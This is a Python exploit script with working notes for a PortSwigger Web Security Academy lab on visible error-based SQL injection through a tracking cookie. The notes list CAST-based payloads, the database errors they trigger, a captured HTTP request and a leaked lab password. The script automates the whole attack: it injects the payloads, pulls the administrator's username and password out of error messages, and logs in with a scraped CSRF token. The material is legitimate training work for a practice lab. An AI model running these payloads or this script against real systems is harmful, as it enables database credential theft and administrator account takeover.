'''
Notes: 

Link: https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based

1. Vulnerability:  Tracking Cookie (Blind SQLi)

2. Goal: 1. Enumerate the Administrator's Password
         2. Log in the administrator Account

3 Analysis: 1. Confirming the parameter is vulnerable
            * Backend Query: SELECT * FROM tracking WHERE id = '<ID>'
                Cookie: TrackingId=FG3Cnm5dAcAWlwzq';   #Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = 'FG3Cnm5dAcAWlwzq''. Expected  char
                + (CONFIRMED) #verbose error
            
            2. Using CAST() #AS VERBOSE ERROR
                FG3Cnm5dAcAWlwzq' AND CAST((SELECT 1) as int)--    #ERROR: argument of AND must be type boolean, not type integer Position: 63

                FG3Cnm5dAcAWlwzq' AND 1 = CAST((SELECT 1) as int)--    #200 OK

                

                FG3Cnm5dAcAWlwzq' AND 1=CAST((SELECT username FROM users) AS int)--    # Unterminated string literal started at position 95 in SQL SELECT * FROM tracking WHERE id = 'FG3Cnm5dAcAWlwzq' AND 1 = CAST((SELECT username from users) '. Expected  char (MOST PROBABLY WE RAN OUT OF CHARACTERS THAT ARE ALLOWED)

                ' AND 1=CAST((SELECT username FROM users) AS int)--    #ERROR: more than one row returned by a subquery used as an expression 


                ' AND 1= CAST((SELECT username FROM users LIMIT 1) AS int)--   #ERROR: invalid input syntax for type integer: "administrator" (Successfully got first username that is administrator)

                ' AND 1= CAST((SELECT password FROM users LIMIT 1) AS int)--   #ERROR: invalid input syntax for type integer: "r69x7m8h9s919sbmfyn9" (Successfully got first password that is administrator)

                    GET /product?productId=5 HTTP/2
                    Host: 0a84001003513d808307dcd700110028.web-security-academy.net
                    Cookie: TrackingId='+AND+1%3d+CAST((SELECT+password+FROM+users+LIMIT+1)+AS+int)--; session=Laq6NQmamD8d528OoWDjnJCHVKTaxHDw
                    User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
                    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
                    Accept-Language: en-US,en;q=0.5
                    Accept-Encoding: gzip, deflate, br
                    Referer: https://0a84001003513d808307dcd700110028.web-security-academy.net/
                    Dnt: 1
                    Upgrade-Insecure-Requests: 1
                    Sec-Fetch-Dest: document
                    Sec-Fetch-Mode: navigate
                    Sec-Fetch-Site: same-origin
                    Sec-Fetch-User: ?1
                    Priority: u=0, i
                    Te: trailers
        
                
            
4. Exploit: ;)



Code / Notes reference: https://github.com/rkhal101/Web-Security-Academy-Series/blob/main/sql-injection/lab-18/notes.txt

'''


import sys
import requests
import urllib3
import urllib
from bs4 import BeautifulSoup  # Ensure you have BeautifulSoup installed

# Disable warnings for insecure requests
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Set up proxy for HTTP requests (if needed)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

# Helper function to send the payload and return the response
def send_payload(url, cookies):
    try:
        response = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
    except:
        # If there's an issue with the proxy, send the request without it
        response = requests.get(url, cookies=cookies, verify=False)
    return response

# Function to extract the administrator's password using SQL injection
def extract_admin_password(url, tracking_id, session_id):
# Step 1: Extract the username
    payload_char_runout_truncate_error="Unterminated string literal started at position" 
    
    payload1 = "' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--"
    cookies1 = {'TrackingId': tracking_id + payload1, 'session': session_id}
    print("\n(+) Sending payload 1 to extract username...")
    response = send_payload(url, cookies1)

     
    if payload_char_runout_truncate_error in response.text:
        print("[-] Payload Failed because Character Limit!!!")

    payload2 = "' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--"
    cookies2 = {'TrackingId': payload2, 'session': session_id}
    
    print("\n(+) Sending payload 2 to extract username...")
    response = send_payload(url, cookies2)

    username_error_indicator = "invalid input syntax for type integer"
    if username_error_indicator in response.text:
        # Extract the string after 'invalid input syntax for type integer: '
        start_index = response.text.find('invalid input syntax for type integer: "') + len('invalid input syntax for type integer: "')
        end_index = response.text.find('"', start_index)
        username = response.text[start_index:end_index]
        print("(+) Username is '%s'."%username)
    else:
        print("[-] Failed to retrieve the username.")
        sys.exit(1)

    # Step 2: Extract the administrator's password

    payload1 = "' AND 1=CAST((SELECT password FROM users WHERE username='%s') AS int)--"%username
    cookies1 = {'TrackingId': tracking_id + payload1, 'session': session_id}
    print("\n(+) Sending payload 1 to extract password...")
    response = send_payload(url, cookies1)

    if payload_char_runout_truncate_error in response.text:
        print("[-] Payload Failed because Character Limit!!!\n")


    payload2 = "' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--"
    cookies2 = {'TrackingId': payload2, 'session': session_id}
    
    print("(+) Sending payload 2 to extract password...")
    response = send_payload(url, cookies2)

    # Look for the password in the error message
    password_error_indicator = "invalid input syntax for type integer"
    if password_error_indicator in response.text:
        # Extract the string after 'invalid input syntax for type integer: '
        start_index = response.text.find('invalid input syntax for type integer: "') + len('invalid input syntax for type integer: "')
        end_index = response.text.find('"', start_index)
        admin_password = response.text[start_index:end_index]
        print(f"(+) Extracted Administrator Password: {admin_password}")
        # Attempt to log in as the administrator
        if login_as_admin(requests.Session(), url + "/login",username , admin_password):
            print("[+] SQL injection successful! Logged in as Administrator :)")
        else:
            print("[-] SQL injection unsuccessful!")    
        return  # Exit the function once the password is found
    else:
        print("[-] Failed to retrieve the password.")
        sys.exit(1)

def get_initial_cookies(url):
    try:
        response = requests.get(url, verify=False, proxies=proxies)
    except:
        response = requests.get(url, verify=False)
    
    # Extract cookies from the response
    tracking_id = response.cookies.get('TrackingId', '')
    session_id = response.cookies.get('session', '')

    print("[+] Extracted Tracking ID: %s"%tracking_id)
    print("[+] Extracted Session: %s"%session_id)

    # Check if cookies were retrieved successfully
    if not tracking_id or not session_id:
        print("[-] Failed to retrieve cookies from the target website.")
        sys.exit(1)  # Exit if cookies are not found

    return tracking_id, session_id

# Function to get CSRF token from the login page
def get_csrf_token(session, url):
    try:
        response = session.get(url, verify=False, proxies=proxies)
    except: 
        response = session.get(url, verify=False)

    # Parse the response to find the CSRF token
    soup = BeautifulSoup(response.text, 'html.parser')
    csrf_token = soup.find("input")['value']
    return csrf_token

# Function to log in as the administrator using the extracted password
def login_as_admin(session, url_login, username, admin_password):
    csrf_token = get_csrf_token(session, url_login)  # Get CSRF token
    login_data = {
        "csrf": csrf_token,
        "username": username,
        "password": admin_password
    }
    
    try:
        # Send a POST request to log in
        response = session.post(url_login, data=login_data, verify=False, proxies=proxies)
    except:
        response = session.post(url_login, data=login_data, verify=False)

    # Check if login was successful by looking for the logout message
    if "Log out" in response.text:
        return True  # Return true if logged in successfully
    else:
        return False  # Return false if login failed

# Main function to execute the SQL injection attack
def main(): 
    try:
        url = sys.argv[1]
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        # Edit The url
        url = 'https://0a87001704adaf2f81e866fe00b000f2.web-security-academy.net'  # Update Domain here  
    
    print("(+) Retrieving initial cookies from the website...")
    tracking_id, session_id = get_initial_cookies(url)  # Retrieve the cookies dynamically

    extract_admin_password(url, tracking_id, session_id)  # Start the password extraction process

# Run the main function when the script is executed
if __name__ == "__main__":
    main()

